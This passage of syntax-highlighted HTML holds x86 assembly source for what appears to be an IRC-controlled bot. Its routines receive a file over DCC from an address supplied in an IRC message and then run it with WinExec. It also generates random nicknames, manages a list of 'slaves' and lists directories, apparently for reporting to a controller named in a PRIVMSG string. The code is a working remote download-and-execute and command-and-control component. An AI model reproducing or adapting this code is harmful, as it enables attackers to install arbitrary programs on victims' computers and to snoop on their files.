        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CreateThread</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">StackUsed</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DCCSend</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Temp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DCCSendFunction</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">GenerateNewNick</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">MyNick</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">Random</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">; how many chars (4-8)</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">Random</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Z'</span><span class="sc4">-</span><span class="sc12">'A'</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; store character</span><span class="sc0">

    </span><span class="sc5">CreateNickLoop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">Random</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'z'</span><span class="sc4">-</span><span class="sc12">'a'</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">CreateNickLoop</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UpdateScriptFile</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">NickCommand</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrcpy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MyNick</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SendMsg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NickCommand</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">DCCRecv</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">DCCMessage</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">DCCConnection</span><span class="sc4">:</span><span class="sc5">sockaddr_in</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">DCCSocket</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">DCCFileptr</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">DCCTemp</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">DCCFilename</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">


        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">socket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">AF_INET</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SOCK_STREAM</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">DCCSocket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">DCCConnection.sin_family</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">AF_INET</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DCCMessage</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SplitStringAtSpace</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">; eax -&gt; ip</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlen</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DCCMessage</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalAlloc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LMEM_ZEROINIT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">DCCFilename</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrcpy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DCCMessage</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DCCMessage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MyOpenFile</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ErrorRecieving</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">DCCFileptr</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SplitStringAtSpace</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">; eax -&gt; port</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">AsciiToNum</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">htonl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">DCCConnection.sin_addr</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SplitStringAtSpace</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">; eax -&gt; size</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">AsciiToNum</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">AsciiToNum</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">htons</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">DCCConnection.sin_port</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">DCCConnection.sin_zero</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DCCConnection</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">connect</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DCCSocket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">sizeof</span><span class="sc4">(</span><span class="sc5">sockaddr_in</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SOCKET_ERROR</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FileRecieved</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc5">RecieveFileLoop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">recv</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DCCSocket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DCCMessage</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; copy data to buffert</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ErrorRecieving</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; ebx = how much more data</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">DCCTemp</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">WriteFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DCCFileptr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DCCMessage</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">htonl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">DCCTemp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DCCTemp</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">send</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DCCSocket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">RecieveFileLoop</span><span class="sc0">


</span><span class="sc5">FileRecieved</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">closesocket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DCCSocket</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DCCFileptr</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalFree</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DCCMessage</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">WinExec</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DCCFilename</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SW_SHOW</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">DownloadedFiles</span><span class="sc0">

      </span><span class="sc5">GetEndOfFileList</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlenInc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">NoChangeBack</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
     </span><span class="sc5">NoChangeBack</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">GetEndOfFileList</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrcpy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DCCFilename</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlenInc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">ScriptFileSize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UpdateScriptFile</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalFree</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DCCFilename</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">
        
</span><span class="sc5">ErrorRecieving</span><span class="sc4">:</span><span class="sc0">        
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalFree</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DCCFilename</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">closesocket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DCCSocket</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DCCFileptr</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalFree</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DCCMessage</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">DCCRecv</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">DCCRecvFunction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalAlloc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LMEM_ZEROINIT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2000</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlen</span><span class="sc4">,[</span><span class="sc5">Buffs</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrcpyn</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Buffs</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SplitStringAtSpace</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">GENERIC_READ</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MyOpenFile</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ErrorDCCRecv</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlen</span><span class="sc4">,[</span><span class="sc5">Buffs</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrcpyn</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Buffs</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DCCRecv</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CreateThread</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">StackUsed</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Temp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">ErrorDCCRecv</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalFree</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ShouldRecieveProgram</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CreateFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Buffs</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">DontDownloadFile</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SendMsg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetFileString</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">DontDownloadFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">NewSlaveFunction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NumSlaves</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">Slaves</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Slave1</span><span class="sc0">

    </span><span class="sc5">LookForFreeSlaveSlot</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">AddNewSlave</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">LookForFreeSlaveSlot</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">Random</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'1'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">NoPlaceString</span><span class="sc4">+</span><span class="sc2">26</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SendMsg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NoPlaceString</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">DirMessage</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"PRIVMSG Bhunji :$3"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">DirFile</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"dirfile.txt"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">DirFunction</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">FindData</span><span class="sc4">:</span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">FileHandle</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">FindData</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc4">:</span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DirFile</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MyOpenFile</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ErrorDirFunction</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">FileHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetCurrentDirectory</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">300</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RecvString</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SetCurrentDirectory</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PathString</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Buffs</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">FindFirstFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
